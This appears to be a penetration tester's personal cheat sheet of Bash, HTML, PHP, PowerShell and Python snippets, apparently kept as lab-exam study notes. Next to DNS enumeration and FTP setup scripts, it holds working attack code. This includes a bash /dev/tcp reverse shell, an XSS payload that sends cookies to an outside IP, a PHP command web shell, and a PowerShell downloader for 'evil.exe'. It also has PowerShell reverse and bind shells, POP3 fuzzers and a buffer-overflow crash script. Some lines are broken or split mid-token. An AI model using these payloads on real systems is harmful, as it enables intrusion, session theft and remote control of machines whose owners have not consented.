BASH
_______________________________________________________________________________________________
for url in $(grep -o '[A-Za-z0-9_\.-]*\.*cisco.com' index.html | sort -u); do host $url | grep "has address" | cut -d " " -f4; done

_______________________________________________________________________________________________

tftp server on kali
mkdir /tftp
atftp --daemon --port 69 /tftp
_______________________________________________________________________________________________
#world writeable files

find / -perm -2 ! -type l -ls 2>/dev/null
_______________________________________________________________________________________________
#bash reverse shell

bash -i >& /dev/tcp/[IP_address]/[Port#] 0>&1
_______________________________________________________________________________________________
#!/bin/bash

for url in $(cat cisco.txt); do
	host $url | grep "has address" | cut -d " " -f4
done

____________________________________________________________________________
#!/bin/bash
#Forward DNS lookups
#list contains common host names
#insert [url.com]

for name in $(cat list.txt); do
	host $name.[url.com] | grep "has address" | cut -d " " -f1,4
done

____________________________________________________________________________
#!/bin/bash
#Reverse DNS lookups
#insert [name, Ex. Google]/change IP

for ip in $(seq 1 255); do
	host 192.168.1.$ip | grep "[name]" | cut -d " " -f1,5
done

____________________________________________________________________________

host -t ns [domain]

host -l [zome]
____________________________________________________________________________
#/bin/bash

for server in $(host -t ns [domain] | cut -d " " -f4; do 
	host -l [domain] $server;
done
____________________________________________________________________________
#/bin/bash
#Zone Transer Bash SCript
# $1 is the first argument given after the bash script ./[scriptname] [domain]
# check if argument was given, if not, print usage

if [ -z "$1"]; then
	echo "[*] Simple Zone Transfer script"
	echo "[*] Usage : $0 <domain name> "
	exit 0
fi

# If argument was given, identify the DNS servers for the domain
# For each of these servers, attempt a zone transfer
for server in $(host -t ns $1 | cut -d " " -f4); do
	host -l $1 $server | grep "has address"
done
____________________________________________________________________________
#!/bin/bash
# creates an ftp server with username: user asks for a password

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd user -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60 pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

____________________________________________________________________________

#!/bin/bash
#function return value example
return_me() {
echo "Oh hello there, I'm returning a random value!"
return $RANDOM
}

return_me
echo "The previous function returned a value of $?"
____________________________________________________________________________
bash

#this will refine data [in index.html] to output only the domain name
#insert website name

grep "href=" index.html | grep "\.[insert name. Ex. google]" | grep -v "www\.[insert same name]" | awk -F "http://" '{print $2}' | cut -d "/" -f 1

#does the same thing, more compact and won't miss possible lines
grep -o '[^/]*\.[insert name]\.com' index.html | sort -u > list.txt
____________________________________________________________________________

#!/bin/bash
#Bash script to search for a given exploit and download all matches.

for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")
do
	exp_name=$(echo $e | cut -d "/" -f 5)
	url=$(echo $e | sed 's/exploits/raw/')
	wget -q --no-check-certificate $url -O $exp_name
done
____________________________________________________________________________
#bash one liner
#refines an nmap scan, next script automates further

for ip in $(cat nmap-scan | grep 80 | grep -v "Nmap" |
awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done
____________________________________________________________________________

#!/bin/bash
#Bash script to examine the scan results through HTML.

echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> web.html
echo "</BODY></HTML>" >> web.html
____________________________________________________________________________
HTML
____________________________________________________________________________
<script> new Image().src="http://192.168.248.128:81/bogus.php output="+document.cookie; </script>
____________________________________________________________________________

<iframe SRC=http://192.168.248.128:81/report" height ="0" width="0"></iframe>
____________________________________________________________________________
#php code for bash

echo '<?php echo shell_exec("ipconfig");?>' > /var/www/example.text

____________________________________________________________________________
#php nc into port 80
<?php echo shell_exec($_GET['cmd']);?>
____________________________________________________________________________
Powershell
____________________________________________________________________________
#http downloader
# powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

echo $storageDir = $pwd >wget.ps1
echo $webclient = New-Object System.Net.Webclient >> wget.ps1
echo $url = "http://192.168.248.128/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
____________________________________________________________________________
#connects to an ftp server and downloads a file
echo open [IP] > ftp.txt
echo [username] >> ftp.txt
echo [password]>> ftp.txt
echo bin >> ftp.txt
echo GET [Program name] >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
____________________________________________________________________________
#VBscript http downloader
# cscript wget.vbs http://[IP]/[filename] [filename save]
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
____________________________________________________________________________
#Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
____________________________________________________________________________
#Bind shell  one liner through cmd.exe

powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
____________________________________________________________________________
#REVERSE SHELL
#reformat for one liner

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"
____________________________________________________________________________
#BIND SHELL
#reformat for one liner

powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
'0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
____________________________________________________________________________
Python
____________________________________________________________________________
#!/usr/bin/python
import socket
import sys

#Insert username and IP_Address

if len(sys.argv) !=2:
	print "Usage: vrfy.py [username]"
	sys.exit(0)
# Create a Socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect=s.connect(('[IP_Address]',25))
# Receive the banner
banner=s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result=s.recv(1024)
print result
# Close the socket
s.close()
____________________________________________________________________________

#!/usr/bin/python

import socket

# Create an array of buffers

buffer= ["A"]
counter= 100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter+=200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('[IP_address]',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()

____________________________________________________________________________
#!/usr/bin/python
# use pattern_create.rb to generate unique strings
# use pattern_offset.rb to find exact string match

import socket

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer= 'A' * 2700

try:
	print "\nSending buffer..."
# Connect to IP, POP3 Port Receive Banner
	s.connect(('[IP_address]',110))
	data= s.recv(1024)
	print data
# Send Username Receive reply
	s.send('USER [username]' + '\r\n')
	data= s.recv(1024)
	print data
# send password Receive reply Close socket
	s.send('PASS ' + buffer + '\r\n')
	data= s.recv(1024)
	print data
	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3!"

____________________________________________________________________________

#!/usr/bin/python
# Buffer overflow attack on crossfire program
# Run crossfire with "edb --run /usr/games/crossfire/bin/crossfire"
# use pattern_create.rb to generate unique strings
# use pattern_offset.rb to find exact string match
#-ruby /usr/share/metasploit-framework/tools/nasm_shell.rb
#>add eax,12
#>jmp eax

import socket

host = "127.0.0.1"

crash = "\x41" * 4739

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending buffer..."
s.connect((host, 13327))
s.send(buffer)
data = s.recv(1024)
print data
s.close()
print "[*]Payload Sent!"

____________________________________________________________________________







